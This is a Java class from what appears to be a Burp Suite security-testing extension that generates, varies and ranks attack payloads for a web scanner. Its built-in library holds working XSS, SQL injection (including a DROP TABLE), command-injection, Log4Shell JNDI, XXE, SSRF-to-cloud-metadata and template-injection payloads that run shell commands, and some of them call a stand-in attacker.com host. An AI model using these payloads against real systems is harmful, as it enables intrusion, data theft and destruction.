package com.secure.ai.burp.core;

import com.secure.ai.burp.ml.AdvancedModelManager;
import com.secure.ai.burp.ml.TrafficAnalysisRequest;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.time.LocalDateTime;
import java.util.*;
import java.util.concurrent.ThreadLocalRandom;
import java.util.stream.Collectors;

public class IntelligentPayloadGenerator {
    private static final Logger logger = LoggerFactory.getLogger(IntelligentPayloadGenerator.class);
    
    private final AdvancedModelManager modelManager;
    private final EvolutionaryPayloadEngine evolutionEngine;
    private final ContextAwarePayloadFactory payloadFactory;
    private final PayloadEffectivenessTracker effectivenessTracker;
    private final TechnologySpecificGenerator techGenerator;
    
    // Payload Generation Configuration
    private final PayloadGenerationConfig config;
    private final Map<String, List<String>> basePayloadLibrary;
    private final Map<String, PayloadTemplate> templateLibrary;
    
    public IntelligentPayloadGenerator(AdvancedModelManager modelManager) {
        this.modelManager = modelManager;
        this.evolutionEngine = new EvolutionaryPayloadEngine();
        this.payloadFactory = new ContextAwarePayloadFactory();
        this.effectivenessTracker = new PayloadEffectivenessTracker();
        this.techGenerator = new TechnologySpecificGenerator();
        this.config = new PayloadGenerationConfig();
        
        this.basePayloadLibrary = initializeBasePayloadLibrary();
        this.templateLibrary = initializeTemplateLibrary();
        
        logger.info("Intelligent payload generator initialized with {} vulnerability types", 
                   basePayloadLibrary.size());
    }
    
    public List<GeneratedPayload> generatePayloads(TrafficAnalysisRequest request, ApplicationContext appContext) {
        logger.debug("Generating context-aware payloads for request {}", request.getRequestId());
        
        List<GeneratedPayload> generatedPayloads = new ArrayList<>();
        
        try {
            // Phase 1: Determine target vulnerability types based on context
            Set<String> targetVulnerabilities = determineTargetVulnerabilities(request, appContext);
            
            // Phase 2: Generate payloads for each vulnerability type
            for (String vulnType : targetVulnerabilities) {
                generatedPayloads.addAll(generatePayloadsForVulnerability(vulnType, request, appContext));
            }
            
            // Phase 3: Apply evolutionary improvements
            generatedPayloads = evolutionEngine.evolvePayloads(generatedPayloads, request, appContext);
            
            // Phase 4: Technology-specific enhancements
            generatedPayloads = techGenerator.enhanceForTechnologies(generatedPayloads, appContext);
            
            // Phase 5: Rank and filter payloads
            generatedPayloads = rankAndFilterPayloads(generatedPayloads, request, appContext);
            
            logger.debug("Generated {} payloads for {} vulnerability types", 
                        generatedPayloads.size(), targetVulnerabilities.size());
            
        } catch (Exception e) {
            logger.error("Error generating payloads for request {}", request.getRequestId(), e);
        }
        
        return generatedPayloads;
    }
    
    private Set<String> determineTargetVulnerabilities(TrafficAnalysisRequest request, ApplicationContext appContext) {
        Set<String> targets = new LinkedHashSet<>();
        
        // Always include basic vulnerability types
        targets.add("XSS");
        targets.add("SQL_INJECTION");
        
        // Context-aware vulnerability targeting
        String payload = request.getPayload().toLowerCase();
        String url = request.getUrl() != null ? request.getUrl().toLowerCase() : "";
        String method = request.getHttpMethod();
        
        // Method-based targeting
        if ("POST".equals(method) || "PUT".equals(method)) {
            targets.add("CSRF");
            targets.add("XXE");
        }
        
        // URL-based targeting
        if (url.contains("file") || url.contains("download") || url.contains("upload")) {
            targets.add("PATH_TRAVERSAL");
            targets.add("LFI");
            targets.add("RFI");
        }
        
        if (url.contains("admin") || url.contains("manage")) {
            targets.add("PRIVILEGE_ESCALATION");
            targets.add("AUTHENTICATION_BYPASS");
        }
        
        // Technology-specific targeting
        for (String technology : appContext.getDetectedTechnologies()) {
            targets.addAll(getVulnerabilitiesForTechnology(technology));
        }
        
        // Payload content-based targeting
        if (payload.contains("select") || payload.contains("union") || payload.contains("'")) {
            targets.add("SQL_INJECTION");
            targets.add("NOSQL_INJECTION");
        }
        
        if (payload.contains("<") || payload.contains("script") || payload.contains("javascript")) {
            targets.add("XSS");
            targets.add("HTML_INJECTION");
        }
        
        if (payload.contains("../") || payload.contains("..\\") || payload.contains("%2e%2e")) {
            targets.add("PATH_TRAVERSAL");
        }
        
        if (payload.contains("http://") || payload.contains("https://") || payload.contains("ftp://")) {
            targets.add("SSRF");
            targets.add("RFI");
        }
        
        // Limit the number of target vulnerabilities for performance
        return targets.stream().limit(config.getMaxVulnerabilityTypes()).collect(Collectors.toSet());
    }
    
    private Set<String> getVulnerabilitiesForTechnology(String technology) {
        Map<String, Set<String>> techVulnMap = Map.of(
            "php", Set.of("RCE", "LFI", "RFI", "CODE_INJECTION"),
            "java", Set.of("DESERIALIZATION", "EL_INJECTION", "XXE"),
            "python", Set.of("SSTI", "PICKLE_INJECTION", "CODE_INJECTION"),
            "javascript", Set.of("PROTOTYPE_POLLUTION", "XSS", "SSRF"),
            "wordpress", Set.of("FILE_UPLOAD", "PLUGIN_VULN", "THEME_VULN"),
            "mysql", Set.of("SQL_INJECTION", "TIME_BASED_BLIND"),
            "mongodb", Set.of("NOSQL_INJECTION", "OPERATOR_INJECTION"),
            "apache", Set.of("SERVER_SIDE_INCLUDE", "HTACCESS_BYPASS"),
            "nginx", Set.of("CONFIG_BYPASS", "FASTCGI_VULN")
        );
        
        return techVulnMap.getOrDefault(technology.toLowerCase(), Collections.emptySet());
    }
    
    private List<GeneratedPayload> generatePayloadsForVulnerability(String vulnType, 
                                                                   TrafficAnalysisRequest request, 
                                                                   ApplicationContext appContext) {
        List<GeneratedPayload> payloads = new ArrayList<>();
        
        // Get base payloads for vulnerability type
        List<String> basePayloads = basePayloadLibrary.getOrDefault(vulnType, Collections.emptyList());
        
        // Get effective payloads from learning history
        List<String> effectivePayloads = effectivenessTracker.getEffectivePayloads(vulnType);
        
        // Combine and diversify payloads
        Set<String> allPayloads = new LinkedHashSet<>();
        allPayloads.addAll(basePayloads);
        allPayloads.addAll(effectivePayloads);
        
        // Generate context-aware variations
        for (String basePayload : allPayloads.stream().limit(config.getMaxBasePayloads()).collect(Collectors.toList())) {
            List<String> variations = payloadFactory.generateContextualVariations(
                basePayload, vulnType, request, appContext);
            
            for (String variation : variations) {
                GeneratedPayload generatedPayload = new GeneratedPayload(
                    variation, vulnType, calculatePayloadScore(variation, vulnType, appContext),
                    generatePayloadMetadata(variation, vulnType, request, appContext),
                    LocalDateTime.now()
                );
                payloads.add(generatedPayload);
            }
        }
        
        // Generate template-based payloads
        PayloadTemplate template = templateLibrary.get(vulnType);
        if (template != null) {
            payloads.addAll(template.generatePayloads(request, appContext));
        }
        
        return payloads;
    }
    
    private double calculatePayloadScore(String payload, String vulnType, ApplicationContext appContext) {
        double score = 0.5; // Base score
        
        // Historical effectiveness bonus
        double effectiveness = effectivenessTracker.getPayloadEffectiveness(payload, vulnType);
        score += effectiveness * 0.3;
        
        // Context relevance bonus
        double contextScore = calculateContextRelevance(payload, vulnType, appContext);
        score += contextScore * 0.2;
        
        // Complexity and sophistication bonus
        double complexityScore = calculatePayloadComplexity(payload);
        score += complexityScore * 0.1;
        
        return Math.min(score, 1.0);
    }
    
    private double calculateContextRelevance(String payload, String vulnType, ApplicationContext appContext) {
        double relevance = 0.0;
        
        // Technology-specific relevance
        for (String technology : appContext.getDetectedTechnologies()) {
            if (isPayloadRelevantForTechnology(payload, technology)) {
                relevance += 0.3;
            }
        }
        
        // Application type relevance
        String appType = appContext.getApplicationType();
        if (isPayloadRelevantForAppType(payload, appType)) {
            relevance += 0.2;
        }
        
        return Math.min(relevance, 1.0);
    }
    
    private boolean isPayloadRelevantForTechnology(String payload, String technology) {
        Map<String, Set<String>> techPatterns = Map.of(
            "php", Set.of("<?php", "phpinfo", "system", "exec", "passthru"),
            "java", Set.of("Runtime.getRuntime", "ProcessBuilder", "javax", "java."),
            "python", Set.of("__import__", "eval", "exec", "os.system"),
            "mysql", Set.of("@@version", "information_schema", "mysql.", "LOAD_FILE"),
            "postgresql", Set.of("version()", "pg_", "current_database"),
            "wordpress", Set.of("wp_", "wordpress", "wp-content", "wp-admin")
        );
        
        Set<String> patterns = techPatterns.get(technology.toLowerCase());
        if (patterns != null) {
            String lowerPayload = payload.toLowerCase();
            return patterns.stream().anyMatch(lowerPayload::contains);
        }
        
        return false;
    }
    
    private boolean isPayloadRelevantForAppType(String payload, String appType) {
        if (appType == null) return false;
        
        String lowerAppType = appType.toLowerCase();
        String lowerPayload = payload.toLowerCase();
        
        if (lowerAppType.contains("cms") && 
            (lowerPayload.contains("admin") || lowerPayload.contains("upload"))) {
            return true;
        }
        
        if (lowerAppType.contains("ecommerce") && 
            (lowerPayload.contains("payment") || lowerPayload.contains("cart"))) {
            return true;
        }
        
        return false;
    }
    
    private double calculatePayloadComplexity(String payload) {
        double complexity = 0.0;
        
        // Length factor
        if (payload.length() > 100) complexity += 0.1;
        if (payload.length() > 200) complexity += 0.1;
        
        // Encoding factor
        if (payload.contains("%") || payload.contains("\\x") || payload.contains("&")) {
            complexity += 0.2;
        }
        
        // Multiple vulnerability type targeting
        int vulnTypes = 0;
        if (payload.toLowerCase().contains("script")) vulnTypes++;
        if (payload.toLowerCase().contains("select") || payload.toLowerCase().contains("union")) vulnTypes++;
        if (payload.contains("../")) vulnTypes++;
        
        if (vulnTypes > 1) complexity += 0.3;
        
        return Math.min(complexity, 1.0);
    }
    
    private Map<String, Object> generatePayloadMetadata(String payload, String vulnType, 
                                                       TrafficAnalysisRequest request, 
                                                       ApplicationContext appContext) {
        Map<String, Object> metadata = new HashMap<>();
        metadata.put("generation_method", "intelligent_context_aware");
        metadata.put("target_vulnerability", vulnType);
        metadata.put("payload_length", payload.length());
        metadata.put("context_technologies", appContext.getDetectedTechnologies());
        metadata.put("application_type", appContext.getApplicationType());
        metadata.put("request_method", request.getHttpMethod());
        metadata.put("url_pattern", extractUrlPattern(request.getUrl()));
        metadata.put("encoding_used", detectEncoding(payload));
        metadata.put("complexity_score", calculatePayloadComplexity(payload));
        return metadata;
    }
    
    private String extractUrlPattern(String url) {
        if (url == null) return "unknown";
        
        // Extract meaningful patterns from URL
        if (url.contains("/admin/")) return "admin_area";
        if (url.contains("/api/")) return "api_endpoint";
        if (url.contains("/upload")) return "file_upload";
        if (url.contains("/login")) return "authentication";
        if (url.contains("/search")) return "search_function";
        
        return "generic";
    }
    
    private List<String> detectEncoding(String payload) {
        List<String> encodings = new ArrayList<>();
        
        if (payload.contains("%")) encodings.add("URL_ENCODED");
        if (payload.contains("&") && (payload.contains("amp;") || payload.contains("lt;") || payload.contains("gt;"))) {
            encodings.add("HTML_ENCODED");
        }
        if (payload.contains("\\x")) encodings.add("HEX_ENCODED");
        if (payload.contains("\\u")) encodings.add("UNICODE_ENCODED");
        if (payload.matches(".*[A-Za-z0-9+/=]{10,}.*")) encodings.add("BASE64");
        
        return encodings;
    }
    
    private List<GeneratedPayload> rankAndFilterPayloads(List<GeneratedPayload> payloads, 
                                                        TrafficAnalysisRequest request, 
                                                        ApplicationContext appContext) {
        // Sort by score (descending)
        payloads.sort((p1, p2) -> Double.compare(p2.getScore(), p1.getScore()));
        
        // Filter duplicates
        Set<String> seenPayloads = new HashSet<>();
        List<GeneratedPayload> filtered = new ArrayList<>();
        
        for (GeneratedPayload payload : payloads) {
            String normalizedPayload = normalizePayload(payload.getPayload());
            if (!seenPayloads.contains(normalizedPayload)) {
                seenPayloads.add(normalizedPayload);
                filtered.add(payload);
                
                // Limit total payloads per vulnerability type
                if (filtered.size() >= config.getMaxPayloadsPerType()) {
                    break;
                }
            }
        }
        
        return filtered;
    }
    
    private String normalizePayload(String payload) {
        // Normalize payload for duplicate detection
        return payload.toLowerCase()
                     .replaceAll("\\s+", " ")
                     .replaceAll("%20", " ")
                     .trim();
    }
    
    public void updateGenerationLearning(TrafficAnalysisRequest request, List<CorrelatedVulnerability> vulnerabilities) {
        try {
            // Learn from successful vulnerability correlations
            for (CorrelatedVulnerability vuln : vulnerabilities) {
                String vulnType = vuln.getType();
                double confidence = vuln.getCorrelationConfidence();
                
                // Update effectiveness for original payload
                effectivenessTracker.updatePayloadEffectiveness(request.getPayload(), vulnType, confidence);
                
                // Learn patterns from successful payloads
                evolutionEngine.learnFromSuccess(request.getPayload(), vulnType, confidence);
            }
            
            logger.debug("Updated payload generation learning for {} vulnerabilities", vulnerabilities.size());
            
        } catch (Exception e) {
            logger.error("Error updating payload generation learning", e);
        }
    }
    
    private Map<String, List<String>> initializeBasePayloadLibrary() {
        Map<String, List<String>> library = new HashMap<>();
        
        // XSS Payloads
        library.put("XSS", Arrays.asList(
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'-alert('XSS')-'",
            "\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input type=image src=x onerror=alert('XSS')>",
            "<video><source onerror=\"javascript:alert('XSS')\">",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
            "<script>alert(String.fromCharCode(88,83,83))</script>"
        ));
        
        // SQL Injection Payloads
        library.put("SQL_INJECTION", Arrays.asList(
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' OR 1=1#",
            "admin'--",
            "' OR 'a'='a",
            "1' OR '1'='1",
            "') OR ('1'='1",
            "' OR 1=1 LIMIT 1--",
            "' UNION ALL SELECT @@version--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' OR (SELECT 'a' FROM DUAL)='a'--"
        ));
        
        // RCE Payloads
        library.put("RCE", Arrays.asList(
            "; ls -la",
            "| whoami",
            "& id",
            "; cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "; ps aux",
            "| cat /etc/hosts",
            "; uname -a",
            "& cat /proc/version",
            "${jndi:ldap://attacker.com/}",
            "{{7*7}}",
            "<%- 7*7 %>",
            "${T(java.lang.Runtime).getRuntime().exec('id')}"
        ));
        
        // Path Traversal Payloads
        library.put("PATH_TRAVERSAL", Arrays.asList(
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/var/www/html/../../../../etc/passwd",
            "file:///etc/passwd",
            "php://filter/read=convert.base64-encode/resource=../../../../etc/passwd"
        ));
        
        // XXE Payloads
        library.put("XXE", Arrays.asList(
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]><root>&test;</root>",
            "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://attacker.com/\" >]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"expect://id\" >]><foo>&xxe;</foo>"
        ));
        
        // SSRF Payloads
        library.put("SSRF", Arrays.asList(
            "http://localhost:22",
            "http://127.0.0.1:3306",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "gopher://127.0.0.1:25",
            "dict://127.0.0.1:11211",
            "http://0.0.0.0:8080",
            "http://[::1]:80",
            "http://2130706433/", // 127.0.0.1 in decimal
            "http://0x7f000001/" // 127.0.0.1 in hex
        ));
        
        // NoSQL Injection Payloads
        library.put("NOSQL_INJECTION", Arrays.asList(
            "{\"$ne\": null}",
            "{\"$gt\": \"\"}",
            "{\"$regex\": \".*\"}",
            "{\"$where\": \"this.username == this.password\"}",
            "'; return db.users.find(); var dummy='",
            "{\"$or\": [{}, {\"foo\": \"bar\"}]}",
            "admin' || 'a'=='a",
            "true, $where: '1 == 1'",
            "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}"
        ));
        
        // SSTI Payloads
        library.put("SSTI", Arrays.asList(
            "{{7*7}}",
            "${7*7}",
            "<%=7*7%>",
            "#{7*7}",
            "{{config}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{request.__class__}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
            "<%- global.process.mainModule.require('child_process').exec('id') %>"
        ));
        
        return library;
    }
    
    private Map<String, PayloadTemplate> initializeTemplateLibrary() {
        Map<String, PayloadTemplate> templates = new HashMap<>();
        
        // Create templates for each vulnerability type
        templates.put("XSS", new XSSPayloadTemplate());
        templates.put("SQL_INJECTION", new SQLInjectionPayloadTemplate());
        templates.put("RCE", new RCEPayloadTemplate());
        templates.put("PATH_TRAVERSAL", new PathTraversalPayloadTemplate());
        
        return templates;
    }
}

// Configuration class for payload generation
class PayloadGenerationConfig {
    private int maxVulnerabilityTypes = 8;
    private int maxBasePayloads = 10;
    private int maxPayloadsPerType = 15;
    private int maxVariationsPerBase = 5;
    private double minPayloadScore = 0.3;
    private boolean enableEvolution = true;
    private boolean enableTechSpecific = true;
    
    // Getters and setters
    public int getMaxVulnerabilityTypes() { return maxVulnerabilityTypes; }
    public void setMaxVulnerabilityTypes(int maxVulnerabilityTypes) { this.maxVulnerabilityTypes = maxVulnerabilityTypes; }
    
    public int getMaxBasePayloads() { return maxBasePayloads; }
    public void setMaxBasePayloads(int maxBasePayloads) { this.maxBasePayloads = maxBasePayloads; }
    
    public int getMaxPayloadsPerType() { return maxPayloadsPerType; }
    public void setMaxPayloadsPerType(int maxPayloadsPerType) { this.maxPayloadsPerType = maxPayloadsPerType; }
    
    public int getMaxVariationsPerBase() { return maxVariationsPerBase; }
    public void setMaxVariationsPerBase(int maxVariationsPerBase) { this.maxVariationsPerBase = maxVariationsPerBase; }
    
    public double getMinPayloadScore() { return minPayloadScore; }
    public void setMinPayloadScore(double minPayloadScore) { this.minPayloadScore = minPayloadScore; }
    
    public boolean isEnableEvolution() { return enableEvolution; }
    public void setEnableEvolution(boolean enableEvolution) { this.enableEvolution = enableEvolution; }
    
    public boolean isEnableTechSpecific() { return enableTechSpecific; }
    public void setEnableTechSpecific(boolean enableTechSpecific) { this.enableTechSpecific = enableTechSpecific; }
}